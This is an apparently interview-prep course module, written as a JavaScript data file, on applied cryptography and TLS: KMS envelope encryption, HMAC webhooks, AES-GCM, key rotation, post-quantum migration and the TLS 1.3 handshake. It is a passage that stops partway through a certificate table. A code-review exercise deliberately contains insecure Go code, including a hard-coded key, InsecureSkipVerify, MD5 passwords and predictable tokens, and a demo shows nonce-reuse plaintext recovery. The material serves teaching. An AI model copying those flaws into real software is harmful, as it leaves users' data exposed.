<p><strong>Encryption context</strong> (AWS) / AAD: key-value pairs bound to the ciphertext and logged — e.g. <code>{tenant: t42, purpose: invoices}</code>; decrypt fails if they differ, and IAM conditions can require them.</p>
<p>Options: AWS KMS, Google Cloud KMS, Azure Key Vault (Managed HSM), HashiCorp Vault <strong>Transit</strong> (encryption as a service), Tink (Google's misuse-resistant crypto library with KMS integrations). Key management basics: separate keys per purpose and environment, least-privilege key policies (separate encrypt and decrypt roles), automatic rotation, alerts on key disable/delete, and documented recovery.</p>`,
          interview: 'Explain the DEK/KEK split and the four steps, then the benefits: performance, rotation by re-wrapping, per-tenant keys, crypto-shredding, audit. Mention encryption context/AAD and that KMS key policies are an access-control layer.',
          examples: [
            {
              label: 'Envelope encryption with AWS KMS (aws-sdk-go-v2)',
              lang: 'go',
              code: `type Envelope struct {
    WrappedDEK []byte \`json:"wrapped_dek"\`
    Ciphertext []byte \`json:"ciphertext"\` // nonce || ct || tag
}

func Seal(ctx context.Context, k *kms.Client, keyID, tenant string, plaintext []byte) (*Envelope, error) {
    encCtx := map[string]string{"tenant": tenant, "purpose": "invoices"}
    dk, err := k.GenerateDataKey(ctx, &kms.GenerateDataKeyInput{
        KeyId:             aws.String(keyID),
        KeySpec:           types.DataKeySpecAes256,
        EncryptionContext: encCtx, // bound + logged in CloudTrail
    })
    if err != nil {
        return nil, err
    }
    defer clear(dk.Plaintext) // best-effort wipe of the plaintext DEK
    ct, err := Encrypt(dk.Plaintext, plaintext, []byte("tenant="+tenant))
    if err != nil {
        return nil, err
    }
    return &Envelope{WrappedDEK: dk.CiphertextBlob, Ciphertext: ct}, nil
}

func Open(ctx context.Context, k *kms.Client, keyID, tenant string, e *Envelope) ([]byte, error) {
    out, err := k.Decrypt(ctx, &kms.DecryptInput{
        CiphertextBlob:    e.WrappedDEK,
        KeyId:             aws.String(keyID),
        EncryptionContext: map[string]string{"tenant": tenant, "purpose": "invoices"},
    })
    if err != nil {
        return nil, err
    }
    defer clear(out.Plaintext)
    return Decrypt(out.Plaintext, e.Ciphertext, []byte("tenant="+tenant))
}`
            }
          ]
        },
        {
          title: 'Secure Randomness and Common Crypto Mistakes',
          def: `<p><strong>Randomness</strong>: secrets (session IDs, tokens, keys, nonces, salts, reset codes) must come from a <strong>CSPRNG</strong>: Go's <code>crypto/rand</code>. <code>math/rand</code> (and <code>math/rand/v2</code>) are for simulations and jitter — predictable to an attacker. Since Go 1.24, <code>crypto/rand.Read</code> never returns an error and <code>rand.Text()</code> returns a 26-character base32 string with 128+ bits of entropy — ideal for tokens.</p>
<p><strong>Common mistakes reviewers look for</strong>:</p>
<table>
<thead><tr><th>Mistake</th><th>Fix</th></tr></thead>
<tbody>
<tr><td>Rolling your own crypto or protocol</td><td>standard library, Tink, libsodium, vetted protocols (TLS, JOSE, Noise)</td></tr>
<tr><td>Unauthenticated encryption (CBC/CTR alone), ECB</td><td>AEAD: AES-GCM, ChaCha20-Poly1305</td></tr>
<tr><td>Nonce/IV reuse, static IVs</td><td>random nonces with key rotation, or counters; GCM-SIV</td></tr>
<tr><td>Hard-coded keys, keys in Git or env dumps</td><td>KMS/secret manager, rotation, scanning</td></tr>
<tr><td><code>==</code> / <code>bytes.Equal</code> for MACs or tokens</td><td><code>hmac.Equal</code>, <code>subtle.ConstantTimeCompare</code></td></tr>
<tr><td>Fast hash for passwords; encrypting passwords</td><td>Argon2id/bcrypt</td></tr>
<tr><td>Base64 / XOR as "encryption"</td><td>it's encoding, not encryption</td></tr>
<tr><td><code>InsecureSkipVerify: true</code> in TLS clients</td><td>proper CA pool; fix certificates instead</td></tr>
<tr><td>MD5/SHA-1 for signatures, RSA-1024, PKCS#1 v1.5 encryption</td><td>SHA-256+, RSA-3072/ECC, OAEP</td></tr>
<tr><td>Using a hash as a KDF (<code>sha256(password)</code> as key)</td><td>HKDF for strong secrets, Argon2id for passwords</td></tr>
<tr><td>Same key for multiple purposes/environments</td><td>key separation via HKDF info strings or separate KMS keys</td></tr>
<tr><td>No rotation or crypto-agility</td><td>versioned key IDs stored with ciphertexts</td></tr>
</tbody>
</table>
<p>Tooling: <code>gosec</code> flags weak crypto (G401–G405, G402 for TLS), and Go's FIPS 140-3 module (Go 1.24, <code>GODEBUG=fips140=on</code>) restricts to approved algorithms where compliance needs it.</p>`,
          interview: 'Be able to spot crypto bugs in a code review: math/rand tokens, == on MACs, static IVs, unauthenticated CBC, hard-coded keys, InsecureSkipVerify. Mention crypto/rand.Text and that "don\'t roll your own" means use high-level vetted APIs.',
          examples: [
            {
              label: 'Tokens: right and wrong',
              lang: 'go',
              code: `// WRONG: predictable (math/rand), and compared non-constant-time
token := fmt.Sprintf("%d", mathrand.Int63())
if token == provided { /* ... */ }

// RIGHT (Go 1.24+)
token := cryptorand.Text()                 // 26 base32 chars, >= 128 bits
stored := sha256.Sum256([]byte(token))     // store only the hash (DB leak != token leak)
got := sha256.Sum256([]byte(provided))
if subtle.ConstantTimeCompare(stored[:], got[:]) == 1 { /* valid */ }`
            }
          ]
        }
      ],
      problems: [
        {
          t: 'Pick the right cryptographic primitive for eight requirements',
          d: 'easy',
          type: 'concept',
          hint: `<ul><li>Is a key involved? Shared or public/private? Must it be reversible?</li><li>Is the input low-entropy (password)?</li><li>Does a third party need to verify?</li></ul>`,
          solution: `1. Detect accidental file corruption                    -> SHA-256 checksum
2. Verify webhook came from our partner (shared secret) -> HMAC-SHA256 over timestamp + body
3. Store user passwords                                 -> Argon2id (salted, memory-hard)
4. Encrypt PII column in Postgres                       -> AES-256-GCM with AAD (row id, tenant), DEK via KMS envelope
5. Let anyone verify our release binaries               -> Ed25519/ECDSA signature (cosign/minisign), public key published
6. Establish session keys between two services          -> TLS 1.3 (ECDHE/X25519MLKEM768 + certificates), not custom DH
7. Generate API keys                                    -> crypto/rand (rand.Text), store SHA-256 hash only
8. Derive separate encryption and MAC keys from one secret -> HKDF with distinct info strings`,
          lang: 'text'
        },
        {
          t: 'Sign and verify webhooks with HMAC-SHA256 in Go',
          d: 'easy',
          type: 'coding',
          hint: `<ul><li>Sign <code>timestamp + "." + rawBody</code> so the timestamp is authenticated.</li><li>Reject timestamps outside a 5-minute window (replay), compare with <code>hmac.Equal</code>.</li><li>Verify over the raw bytes before JSON parsing; support multiple signatures during secret rotation.</li></ul>`,
          solution: `// Header format: Webhook-Signature: t=1793275200,v1=<hex>,v1=<hex-of-old-secret-during-rotation>
func VerifyWebhook(secret []byte, header string, body []byte, now time.Time) error {
    var ts int64
    var sigs [][]byte
    for _, part := range strings.Split(header, ",") {
        k, v, _ := strings.Cut(strings.TrimSpace(part), "=")
        switch k {
        case "t":
            ts, _ = strconv.ParseInt(v, 10, 64)
        case "v1":
            if b, err := hex.DecodeString(v); err == nil {
                sigs = append(sigs, b)
            }
        }
    }
    if ts == 0 || len(sigs) == 0 {
        return errors.New("malformed signature header")
    }
    if d := now.Sub(time.Unix(ts, 0)); d > 5*time.Minute || d < -5*time.Minute {
        return errors.New("timestamp outside tolerance") // replay protection
    }
    mac := hmac.New(sha256.New, secret)
    fmt.Fprintf(mac, "%d.", ts)
    mac.Write(body)
    want := mac.Sum(nil)
    for _, s := range sigs {
        if hmac.Equal(s, want) {
            return nil
        }
    }
    return errors.New("signature mismatch")
}

// Handler: body, _ := io.ReadAll(http.MaxBytesReader(w, r.Body, 1<<20)); verify; then json.Unmarshal(body, &evt)
// Also dedupe by event id to make processing idempotent.`,
          lang: 'go'
        },
        {
          t: 'Encrypt database fields with AES-256-GCM and associated data',
          d: 'medium',
          type: 'coding',
          hint: `<ul><li>Format: <code>version || key_id || nonce || ciphertext || tag</code> for crypto-agility and rotation.</li><li>AAD = table, column, row id, tenant — prevents ciphertext swapping between rows.</li><li>Keys from a keyring (KMS-wrapped), selected by key_id on decrypt.</li></ul>`,
          solution: `type Keyring struct {
    current byte
    keys    map[byte]cipher.AEAD // key_id -> AEAD, DEKs unwrapped from KMS at startup
}

func (k *Keyring) Seal(plaintext []byte, aad string) ([]byte, error) {
    aead := k.keys[k.current]
    out := []byte{1, k.current} // version 1, key id
    nonce := make([]byte, aead.NonceSize())
    rand.Read(nonce)
    out = append(out, nonce...)
    return aead.Seal(out, nonce, plaintext, []byte(aad)), nil
}

func (k *Keyring) Open(blob []byte, aad string) ([]byte, error) {
    if len(blob) < 2 || blob[0] != 1 {
        return nil, errors.New("unknown format")
    }
    aead, ok := k.keys[blob[1]]
    if !ok {
        return nil, errors.New("unknown key id")
    }
    ns := aead.NonceSize()
    if len(blob) < 2+ns+aead.Overhead() {
        return nil, errors.New("short ciphertext")
    }
    return aead.Open(nil, blob[2:2+ns], blob[2+ns:], []byte(aad))
}

// usage
// aad := fmt.Sprintf("customers.ssn|tenant=%s|id=%s", tenantID, customerID)
// blob, _ := kr.Seal([]byte(ssn), aad)
// Rotation: add new key id, make it current; background job re-encrypts rows with old key id.
// Searching encrypted columns: store an HMAC "blind index" of normalized value for equality lookups.`,
          lang: 'go'
        },
        {
          t: 'Show why AES-GCM nonce reuse is catastrophic',
          d: 'medium',
          type: 'concept',
          hint: `<ul><li>GCM encrypts with CTR mode: ciphertext = plaintext XOR keystream(key, nonce).</li><li>Same nonce &rarr; same keystream &rarr; C1 XOR C2 = P1 XOR P2.</li><li>The GHASH key H can also be recovered from two tags, enabling forgeries.</li></ul>`,
          solution: `func main() {
    key := make([]byte, 32)
    rand.Read(key)
    block, _ := aes.NewCipher(key)
    gcm, _ := cipher.NewGCM(block)
    nonce := make([]byte, 12) // BUG: fixed nonce reused

    p1 := []byte("transfer 100 EUR to alice")
    p2 := []byte("transfer 999 EUR to mallory")
    c1 := gcm.Seal(nil, nonce, p1, nil)
    c2 := gcm.Seal(nil, nonce, p2, nil)

    // Attacker knows p1 (e.g. a predictable message) and sees c1, c2:
    n := min(len(p1), len(p2))
    recovered := make([]byte, n)
    for i := 0; i < n; i++ {
        recovered[i] = c1[i] ^ c2[i] ^ p1[i] // keystream cancels out
    }
    fmt.Printf("%s\\n", recovered) // "transfer 999 EUR to mall" -> p2 revealed without the key
}

// Additionally, two (ciphertext, tag) pairs under the same nonce let an attacker solve for the
// GHASH authentication key H and forge valid tags for arbitrary ciphertexts (Joux's "forbidden attack").
// Fix: unique nonces (random + key rotation before ~2^32 messages, or counters), XChaCha20-Poly1305, or AES-GCM-SIV.`,
          lang: 'go'
        },
        {
          t: 'Sign and verify a release artifact with Ed25519 (openssl and Go)',
          d: 'medium',
          type: 'hands-on',
          hint: `<ul><li>Generate an Ed25519 key, sign the artifact with <code>openssl pkeyutl -sign -rawin</code>.</li><li>Distribute the public key through a trusted channel (not next to the artifact only).</li><li>Verify in Go with <code>ed25519.Verify</code>; for containers prefer cosign.</li></ul>`,
          solution: `# Key generation (in practice: KMS/HSM-backed or keyless Sigstore signing)
openssl genpkey -algorithm ed25519 -out release.key
openssl pkey -in release.key -pubout -out release.pub

# Sign and verify (OpenSSL 3.x)
openssl pkeyutl -sign -inkey release.key -rawin -in app-linux-amd64.tar.gz -out app-linux-amd64.tar.gz.sig
openssl pkeyutl -verify -pubin -inkey release.pub -rawin -in app-linux-amd64.tar.gz \\
  -sigfile app-linux-amd64.tar.gz.sig
# Signature Verified Successfully

# Go verifier (embed the public key in the updater binary)
# pubDER := ... parse release.pub with x509.ParsePKIXPublicKey -> ed25519.PublicKey
# ok := ed25519.Verify(pub, artifactBytes, sigBytes)
# if !ok { refuse update }`,
          lang: 'bash'
        },
        {
          t: 'Review Go code for cryptographic mistakes',
          d: 'medium',
          type: 'debug',
          hint: `<ul><li>Look at randomness source, key origin, cipher mode, IV handling, integrity, comparisons, TLS config.</li><li>Expect at least six issues.</li></ul>`,
          solution: `var key = []byte("0123456789abcdef")                          // (1) hard-coded 128-bit key in source
var iv = make([]byte, aes.BlockSize)                           // (2) static zero IV

func NewResetToken() string {
    return strconv.FormatInt(mathrand.Int63(), 16)             // (3) math/rand: predictable token
}

func EncryptCookie(v []byte) string {
    b, _ := aes.NewCipher(key)
    enc := cipher.NewCBCEncrypter(b, iv)                       // (4) CBC without MAC -> malleable, padding oracle
    padded := pkcs7(v)
    out := make([]byte, len(padded))
    enc.CryptBlocks(out, padded)
    return base64.StdEncoding.EncodeToString(out)
}

func CheckSig(got, want string) bool { return got == want }    // (5) timing leak

func HashPassword(p string) string {
    s := md5.Sum([]byte(p)); return hex.EncodeToString(s[:])  // (6) MD5, unsalted, fast
}

var client = &http.Client{Transport: &http.Transport{
    TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}   // (7) MITM-able

Fixes: key from KMS/secret manager; AEAD (AES-GCM / NewGCMWithRandomNonce) with fresh nonces; crypto/rand.Text();
hmac.Equal / subtle.ConstantTimeCompare; Argon2id; proper RootCAs instead of InsecureSkipVerify;
run gosec in CI (flags G101, G401, G402, G404, G501).`,
          lang: 'go'
        },
        {
          t: 'Design per-tenant encryption with key rotation and crypto-shredding',
          d: 'hard',
          type: 'design',
          hint: `<ul><li>Hierarchy: KMS root/tenant KEK &rarr; DEKs (per tenant per period or per object) &rarr; data.</li><li>Rotation: KEK rotation (re-wrap DEKs) vs DEK rotation (new writes use new DEK; optional re-encryption).</li><li>Crypto-shredding: deleting the tenant KEK makes all its data, including backups, unreadable.</li><li>Performance: DEK caching with TTL and bounded usage counts.</li></ul>`,
          solution: `Key hierarchy:
  KMS CMK per tenant (alias tenant/t42) -- key policy: only data-plane role may Encrypt/Decrypt with
                                           EncryptionContext tenant=t42; admins can't decrypt
  DEK per tenant per month, wrapped by tenant CMK, stored in key_registry(tenant, key_id, wrapped_dek, created, state)
  Records: header {key_id, version} + AES-256-GCM(nonce, ct, tag), AAD = tenant|table|row_id

Runtime:
  - DEK cache (in-memory, 5 min TTL, max 2^24 encryptions per DEK) -> KMS calls scale with tenants, not requests
  - Decrypt path loads key_id from record -> unwrap via KMS (cached)

Rotation:
  - CMK automatic annual rotation in KMS (transparent; old versions retained for decrypt)
  - New DEK monthly; background re-encryption job for regulated data; all tracked by key_id

Crypto-shredding (tenant offboarding / GDPR erasure):
  - Schedule CMK deletion (7-30 day window) after export; DEKs become unwrappable => data in DB, replicas,
    snapshots and backups is unreadable. Log + certificate of destruction.

Ops & security:
  - CloudTrail alerts on DisableKey/ScheduleKeyDeletion, decrypt volume anomalies per tenant
  - Separate keys per environment; break-glass procedure; BYOK/HYOK option for enterprise tenants.`,
          lang: 'text'
        },
        {
          t: 'Plan a post-quantum cryptography migration for a platform',
          d: 'hard',
          type: 'design',
          hint: `<ul><li>Start with a cryptographic inventory (CBOM): where are RSA/ECC used, for what, with what data lifetime?</li><li>Prioritize confidentiality of long-lived data in transit: hybrid key exchange first.</li><li>Signatures/PKI later; build crypto-agility (algorithm identifiers, versioned formats).</li></ul>`,
          solution: `Phase 0  Inventory (CBOM): TLS endpoints (edge, mesh, DB), SSH, VPN/IPsec, JWT signing keys, code signing, KMS,
         custom protocols, HSMs, third-party SDKs. Classify by data shelf-life (Mosca's inequality).
Phase 1  Key exchange (harvest-now-decrypt-later):
         - Edge/CDN and load balancers: enable X25519MLKEM768 hybrid groups
         - Go services: Go 1.24+ crypto/tls offers X25519MLKEM768 by default -> upgrade toolchain; check
           tls.Config.CurvePreferences isn't pinning classical-only groups
         - Service mesh (Envoy/Istio) and databases as their TLS stacks gain support
         - Measure: larger ClientHello (~1.1 KB more) can break middleboxes -> test
Phase 2  Crypto-agility: algorithm ids in token headers/ciphertext formats, configurable cipher suites,
         no hard-coded RSA assumptions; library abstraction (Tink).
Phase 3  Signatures: track ML-DSA / SLH-DSA support in CAs, HSMs, JOSE/COSE, Sigstore; pilot for internal PKI
         and code signing; consider hybrid/composite certificates.
Symmetric: ensure AES-256 and SHA-384/256 (already quantum-resistant enough).
Governance: owners per system, timeline aligned with regulator guidance, regression tests for handshake sizes.`,
          lang: 'text'
        }
      ],
      interviewFocus: [
        {
          q: 'What is the difference between encoding, hashing, HMAC, encryption and signing?',
          a: `<table>
<thead><tr><th>Operation</th><th>Key?</th><th>Reversible?</th><th>Provides</th><th>Example</th></tr></thead>
<tbody>
<tr><td>Encoding</td><td>no</td><td>yes, by anyone</td><td>format conversion only</td><td>base64, hex, URL encoding</td></tr>
<tr><td>Hashing</td><td>no</td><td>no</td><td>integrity fingerprint</td><td>SHA-256</td></tr>
<tr><td>HMAC</td><td>shared secret</td><td>no</td><td>integrity + authenticity between key holders</td><td>webhook signatures, HS256</td></tr>
<tr><td>Encryption</td><td>symmetric or public key</td><td>yes, with key</td><td>confidentiality (+ integrity if AEAD)</td><td>AES-GCM, RSA-OAEP</td></tr>
<tr><td>Signing</td><td>private key (verify with public)</td><td>n/a</td><td>integrity, authenticity, non-repudiation</td><td>Ed25519, ECDSA, RSA-PSS</td></tr>
</tbody>
</table>
<p>Common traps: base64 is not encryption; a hash of a secret is not a MAC (length extension); HMAC can't prove to a third party who signed; encryption without authentication is malleable; passwords need slow hashes, not encryption.</p>`
        },
        {
          q: 'How does AES-GCM work and what are its rules of use?',
          a: `<p>AES-GCM is an AEAD mode combining <strong>CTR-mode encryption</strong> (AES encrypts a counter block derived from the nonce to make a keystream XORed with the plaintext) and <strong>GHASH</strong>, a polynomial MAC over the AAD and ciphertext, producing a 16-byte tag.</p>
<ul>
<li><strong>Never reuse a nonce with the same key</strong>: reuse reveals P1 XOR P2 and allows recovering the GHASH key and forging tags.</li>
<li>96-bit nonces; with random nonces stay well below 2<sup>32</sup> encryptions per key; otherwise use counters, key rotation, XChaCha20-Poly1305 or AES-GCM-SIV.</li>
<li>Use AAD to bind context (tenant, record id, version).</li>
<li>Don't release plaintext before tag verification (streaming pitfalls); limit plaintext per message (~64 GB).</li>
<li>Use 256-bit keys from a KMS or KDF, never from passwords directly.</li>
</ul>
<p>In Go: <code>cipher.NewGCM</code>, or <code>cipher.NewGCMWithRandomNonce</code> (Go 1.24) to avoid nonce handling mistakes.</p>`
        },
        {
          q: 'Explain envelope encryption and why cloud KMS services use it.',
          a: `<p>Data is encrypted locally with a <strong>data encryption key (DEK)</strong>; the DEK itself is encrypted (<em>wrapped</em>) with a <strong>key encryption key (KEK)</strong> held inside the KMS/HSM. The wrapped DEK is stored alongside the ciphertext. To decrypt, the service asks KMS to unwrap the DEK — an authorized, logged call — then decrypts locally.</p>
<p>Benefits:</p>
<ul>
<li><strong>Performance and scale</strong>: only 32-byte keys go to KMS; bulk crypto is local.</li>
<li><strong>Security</strong>: KEK never leaves the HSM; access controlled by IAM/key policy and audited.</li>
<li><strong>Rotation</strong>: rotating the KEK requires re-wrapping DEKs, not re-encrypting terabytes.</li>
<li><strong>Isolation</strong>: per-tenant or per-dataset KEKs limit blast radius; <strong>crypto-shredding</strong> by deleting a KEK.</li>
<li><strong>Context binding</strong>: encryption context/AAD ties ciphertext to tenant/purpose and appears in audit logs.</li>
</ul>
<p>Operationally: cache DEKs briefly, bound DEK usage, separate encrypt/decrypt permissions, monitor KMS calls.</p>`
        },
        {
          q: 'How does Diffie-Hellman provide forward secrecy, and why must it be authenticated?',
          a: `<p>In <strong>ephemeral</strong> (EC)DH each side generates a fresh key pair per session, exchanges public values, and computes the same shared secret; the private values are discarded afterwards. Because the session keys are derived only from these ephemeral secrets, compromising the server's long-term private key later does <strong>not</strong> allow decrypting recorded sessions — that is <strong>forward secrecy</strong>. (In TLS 1.2 with RSA key transport, the client encrypted the pre-master secret with the server's RSA key, so a stolen key decrypted all past traffic.)</p>
<p>DH by itself proves nothing about <em>who</em> is on the other side: an active attacker can perform separate exchanges with both parties and relay traffic. TLS 1.3 authenticates the exchange by having the server sign the entire handshake transcript (including both key shares) with its certificate's private key (<strong>CertificateVerify</strong>), and both sides confirm with <strong>Finished</strong> MACs. mTLS adds the same for the client.</p>`
        },
        {
          q: 'What does post-quantum cryptography change for backend engineers today?',
          a: `<ul>
<li><strong>Threat</strong>: Shor's algorithm on a large quantum computer breaks RSA, DH and ECC. Timing is uncertain, but encrypted traffic recorded today can be decrypted later ("harvest now, decrypt later").</li>
<li><strong>Standards</strong>: NIST FIPS 203 (ML-KEM), 204 (ML-DSA), 205 (SLH-DSA), finalized 2024.</li>
<li><strong>Now</strong>: hybrid key exchange <code>X25519MLKEM768</code> in TLS 1.3 — default in modern browsers and in Go's <code>crypto/tls</code> since 1.24. Action: upgrade toolchains/proxies, avoid pinning classical-only curve preferences, test middleboxes with larger ClientHellos.</li>
<li><strong>Next</strong>: post-quantum signatures in PKI, code signing and tokens (larger signatures/keys — affects JWT sizes and certificate chains).</li>
<li><strong>Always</strong>: crypto-agility and a cryptographic inventory; symmetric AES-256 and SHA-2/3 remain fine.</li>
</ul>`
        }
      ],
      quiz: [
        { q: 'Why is SHA256(secret || message) not a safe MAC?', a: 'SHA-256 is vulnerable to length-extension attacks; an attacker can append data and compute a valid digest without the secret. Use HMAC.' },
        { q: 'What does AEAD stand for and name two AEAD ciphers.', a: 'Authenticated Encryption with Associated Data; AES-GCM and ChaCha20-Poly1305.' },
        { q: 'What happens if an AES-GCM nonce is reused with the same key?', a: 'The XOR of the plaintexts leaks and the authentication key can be recovered, allowing forgeries.' },
        { q: 'Which RSA padding should be used for encryption and which for signatures?', a: 'OAEP for encryption and PSS for signatures (PKCS#1 v1.5 encryption is vulnerable to padding-oracle attacks).' },
        { q: 'What property does ephemeral Diffie-Hellman add to TLS?', a: 'Forward secrecy: compromise of the long-term key does not expose past session keys.' },
        { q: 'In envelope encryption, what is stored next to the ciphertext?', a: 'The data encryption key wrapped (encrypted) by the KMS key encryption key, plus key id/version metadata.' },
        { q: 'Which Go package must generate session tokens and keys?', a: 'crypto/rand (e.g. rand.Text() or rand.Read), never math/rand.' },
        { q: 'What are ML-KEM and ML-DSA?', a: 'NIST post-quantum standards: ML-KEM (FIPS 203) for key encapsulation and ML-DSA (FIPS 204) for digital signatures.' },
        { q: 'What silently disables Go\'s default X25519MLKEM768 hybrid key exchange?', a: 'Setting tls.Config.CurvePreferences explicitly without including tls.X25519MLKEM768 (or GODEBUG=tlsmlkem=0); leave CurvePreferences unset to keep the post-quantum hybrid.' }
      ],
      resources: [
        { title: 'OWASP Cryptographic Storage Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html', type: 'docs' },
        { title: 'OWASP Key Management Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Key_Management_Cheat_Sheet.html', type: 'docs' },
        { title: 'RFC 5869 — HMAC-based Key Derivation Function (HKDF)', url: 'https://datatracker.ietf.org/doc/html/rfc5869', type: 'docs' }
      ]
    },
    // ───────────────────────────────────────────── Module 10 ────────────────────────────────────────────
    {
      n: 10,
      title: 'SSL/TLS, Certificates & PKI',
      summary: `Transport security from the handshake up: TLS 1.3 step by step and how it differs from 1.2, cipher suites and forward secrecy, X.509 certificates and chains of trust, CSRs and ACME automation with Let's Encrypt and cert-manager, revocation (CRL, OCSP, stapling) and why short-lived certificates are winning, HSTS and SNI, TLS termination vs passthrough, and how to never have a certificate-expiry outage.`,
      topics: [
        {
          title: 'The TLS 1.3 Handshake, Step by Step (vs TLS 1.2)',
          def: `<p><strong>TLS 1.3</strong> (RFC 8446) completes a full handshake in <strong>one round trip</strong>, encrypts most of the handshake, and only allows forward-secret key exchange.</p>
<ol>
<li><strong>ClientHello</strong>: random, <code>supported_versions</code> (TLS 1.3), cipher suites, <code>key_share</code> (client's ephemeral public key for a guessed group, e.g. X25519 or hybrid X25519MLKEM768), <code>signature_algorithms</code>, <strong>SNI</strong> (server name), <strong>ALPN</strong> (<code>h2</code>, <code>http/1.1</code>), optional <code>pre_shared_key</code> for resumption.</li>
<li><strong>ServerHello</strong>: chosen suite and the server's <code>key_share</code>. Both sides now compute the (EC)DHE shared secret and derive <em>handshake traffic keys</em> with the HKDF key schedule. (Wrong group guess &rarr; <code>HelloRetryRequest</code>, one extra round trip.)</li>
<li>Server sends, <strong>encrypted</strong>: <code>EncryptedExtensions</code> (ALPN result...), optional <code>CertificateRequest</code> (mTLS), <code>Certificate</code> (chain), <code>CertificateVerify</code> (signature over the transcript hash with the certificate's private key — proves possession and authenticates the key exchange), <code>Finished</code> (MAC over the transcript).</li>
<li>Client validates the chain to a trusted root, the hostname against the SAN, validity dates, the <code>CertificateVerify</code> signature and <code>Finished</code>; if requested sends its own <code>Certificate</code> + <code>CertificateVerify</code>; then <code>Finished</code>.</li>
<li>Both derive <em>application traffic keys</em>; the client can send application data immediately after its Finished. The server may send <code>NewSessionTicket</code> for later PSK resumption.</li>
</ol>
<table>
<thead><tr><th></th><th>TLS 1.2</th><th>TLS 1.3</th></tr></thead>
<tbody>
<tr><td>Full handshake</td><td>2-RTT</td><td>1-RTT (0-RTT resumption optional)</td></tr>
<tr><td>Key exchange</td><td>RSA key transport, static DH, or ECDHE</td><td>(EC)DHE / PSK-(EC)DHE only &rarr; always forward secret</td></tr>
<tr><td>Certificate</td><td>sent in cleartext</td><td>encrypted</td></tr>
<tr><td>Ciphers</td><td>many, incl. CBC, RC4, 3DES, SHA-1</td><td>AEAD only (AES-GCM, ChaCha20-Poly1305)</td></tr>
<tr><td>Removed</td><td>—</td><td>renegotiation, compression, custom DH groups, ChangeCipherSpec semantics</td></tr>
</tbody>
</table>
<p><strong>0-RTT early data</strong> lets a resuming client send data in its first flight, but early data is <strong>replayable</strong> — only allow idempotent requests (many servers disable it). TLS 1.0/1.1 are deprecated (RFC 8996); TLS 1.2 is still acceptable with ECDHE + AEAD suites.</p>`,
          interview: 'This is a top interview question. Narrate ClientHello (key_share, SNI, ALPN) -> ServerHello (key_share) -> encrypted EncryptedExtensions/Certificate/CertificateVerify/Finished -> client verification and Finished, and explain what CertificateVerify proves. Then contrast with 1.2: 2-RTT, RSA key transport, cleartext certificate.',
          examples: [
            {
              label: 'Observe a TLS 1.3 handshake',
              lang: 'bash',
              code: `# Negotiated version, cipher, group, ALPN, certificate chain
openssl s_client -connect example.com:443 -servername example.com -tls1_3 -alpn h2,http/1.1 -brief </dev/null

# Full chain as sent by the server
openssl s_client -connect example.com:443 -servername example.com -showcerts </dev/null 2>/dev/null \\
  | grep -E '^( [0-9] s:| {3}i:)'

# Timing view (connect vs TLS handshake time)
curl -so /dev/null -w 'tcp=%{time_connect}s tls=%{time_appconnect}s http=%{http_version}\\n' https://example.com`
            }
          ]
        },
        {
          title: 'Cipher Suites and Forward Secrecy',
          def: `<p>A <strong>TLS 1.2 cipher suite</strong> names four algorithms: <code>ECDHE-ECDSA-AES128-GCM-SHA256</code> = key exchange (ECDHE) + authentication (ECDSA certificate) + bulk AEAD cipher (AES-128-GCM) + PRF hash (SHA-256).</p>
<p><strong>TLS 1.3 suites</strong> name only the AEAD and hash, because key exchange and signature are negotiated separately:</p>
<ul>
<li><code>TLS_AES_128_GCM_SHA256</code>, <code>TLS_AES_256_GCM_SHA384</code>, <code>TLS_CHACHA20_POLY1305_SHA256</code> (plus two rarely used CCM suites).</li>
</ul>
<p><strong>Recommended configuration</strong> (in the spirit of Mozilla's "intermediate" profile): TLS 1.2 and 1.3 only; for 1.2, ECDHE with AES-GCM or ChaCha20-Poly1305; ECDSA P-256 or RSA-2048+ certificates; no CBC, RC4, 3DES, static RSA, export or NULL suites. For internal service-to-service traffic, use TLS 1.3 only.</p>
<p><strong>Go's <code>crypto/tls</code></strong> has safe defaults: TLS 1.3 suites are not configurable (all are secure), the TLS 1.2 defaults are ECDHE+AEAD, the minimum version defaults to TLS 1.2 for clients and servers, and hybrid <code>X25519MLKEM768</code> is offered by default since Go 1.24. Usually you only set <code>MinVersion</code> (and avoid overriding <code>CurvePreferences</code> or <code>CipherSuites</code> unless you have a compliance reason).</p>
<p><strong>Forward secrecy</strong>: with ephemeral (EC)DHE each session's keys are independent of the server's long-term key; stealing the certificate key later doesn't decrypt recorded traffic. Two caveats: <strong>session ticket keys</strong> must be rotated (a stolen ticket key decrypts resumed sessions), and TLS-inspection setups that share private keys with passive decryption appliances only work with RSA key transport — which is exactly why TLS 1.3 removed it.</p>`,
          interview: 'Decompose a TLS 1.2 suite name, list the TLS 1.3 suites, and explain why 1.3 suites are shorter. Know Go\'s defaults and that you rarely need to set CipherSuites. Explain forward secrecy and the session-ticket-key caveat.',
          examples: [
            {
              label: 'Scan supported protocols and suites',
              lang: 'bash',
              code: `# nmap script lists protocols and graded cipher suites
nmap --script ssl-enum-ciphers -p 443 api.example.com

# Is TLS 1.0/1.1 still accepted? (should fail)
openssl s_client -connect api.example.com:443 -tls1_1 </dev/null 2>&1 | grep -E 'alert|Protocol'

# testssl.sh gives a full report (protocols, suites, FS, HSTS, OCSP, vulnerabilities)
testssl.sh --fast https://api.example.com`
            }
          ]
        },
        {
          title: 'X.509 Certificates and the Chain of Trust',
          def: `<p>An <strong>X.509 v3 certificate</strong> (RFC 5280) binds a public key to an identity, signed by an issuer. Key fields:</p>
<table>
<thead><tr><th>Field / extension</th><th>Purpose</th></tr></thead>
<tbody>
<tr><td>Serial number, signature algorithm, issuer</td><td>identify the certificate and who signed it</td></tr>
<tr><td>Validity (<code>notBefore</code>, <code>notAfter</code>)</td><td>lifetime</td></tr>
<tr><td>Subject + SubjectPublicKeyInfo</td><td>whose key; the public key</td></tr>
<tr><td><strong>Subject Alternative Name</strong></td><td>DNS names, IPs, URIs (e.g. SPIFFE IDs) — the <em>only</em> place hostnames are checked; CN is ignored by browsers and Go</td></tr>
<tr><td>Key Usage / Extended Key Usage</td><td><code>digitalSignature</code>; <code>serverAuth</code>, <code>clientAuth</code>, <code>codeSigning</code></td></tr>
<tr><td>Basic Constraints</td><td><code>CA:TRUE</code>, <code>pathlen</code> — whether it can sign other certs</td></tr>
<tr><td>Name Constraints</td><td>restrict a CA to e.g. <code>.internal.example.com</code></td></tr>
